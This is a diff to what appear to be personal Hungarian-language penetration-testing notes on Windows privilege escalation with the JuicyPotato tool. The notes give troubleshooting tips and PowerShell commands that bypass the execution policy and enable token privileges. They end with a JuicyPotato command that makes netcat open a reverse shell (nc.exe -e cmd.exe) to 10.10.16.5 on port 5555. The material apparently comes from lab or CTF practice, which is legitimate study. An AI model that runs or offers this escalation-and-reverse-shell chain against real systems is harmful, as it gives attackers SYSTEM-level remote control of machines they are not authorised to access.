@@ -8,9 +8,17 @@
   * Enable privileges
     * https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1
     * https://www.leeholmes.com/adjusting-token-privileges-in-powershell/
+* Eloszor futtassuk a JuciyPotato binary-t uresen. Ki kell hogy adja e help menut.
+* Utana parameteresen futtassuk
+  * Ha hiba van, erdemes megnezni egyesevel a cmd es nc binary-kat az absolute uttal, hogy jok e
+  * Ha COM recv hiba van, akkor masik clsid-t probaljunk meg
+    * Minden oprendszer verziohoz kulon vannak, itt talalhatok
+      * https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+    * Valasszuk ki a megfelelo oprendszer verziot, es ott 4-5 darabot probaljunk meg a clsid-k kozul, valamelyiknek mukodnie kell
 <pre>
-C:\> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
-C:\> Import-Module .\EnableAllTokenPrivs.ps1
-C:\> Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
-C:\> whoami /priv (most mar elvileg Enabled lett)
+PS> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+PS> Import-Module .\EnableAllTokenPrivs.ps1
+PS> Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
+PS> whoami /priv (most mar elvileg Enabled lett)
+PS> .\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\downloads\nc.exe 10.10.16.5 5555 -e c:\windows\system32\cmd.exe" -t * -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"
 </pre>
